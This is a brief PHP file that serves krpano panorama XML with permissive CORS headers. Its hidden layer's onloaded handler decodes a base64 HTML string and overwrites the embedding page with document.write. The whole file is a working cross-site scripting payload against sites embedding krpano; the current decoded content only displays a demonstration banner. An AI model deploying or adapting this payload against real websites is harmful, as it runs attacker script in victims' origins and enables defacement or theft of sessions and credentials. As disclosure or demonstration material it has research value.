<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/xml');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}
?><?xml version="1.0" encoding="UTF-8"?>
<krpano version="1.0.8.15">
  <layer name="demo" type="container" visible="false"
    onloaded="js((function(){const html=atob('PGh0bWw+PGJvZHkgc3R5bGU9Zm9udC1mYW1pbHk6c3lzdGVtLXVpO3BhZGRpbmc6MmVtPjxoMT5UaGlzIHBhZ2UgY29udGVudCBoYXMgYmVlbiByZXBsYWNlZCB1c2luZyBhIHRlY2huaXF1ZSBkZXNjcmliZWQgb24gdGhlIENvbW11bml0eSBTZXJ2aWNlIEhvdXIgcG9kY2FzdC48L2gxPjwvYm9keT48L2h0bWw+');document.open();document.write(html);document.close();})())" />
</krpano>
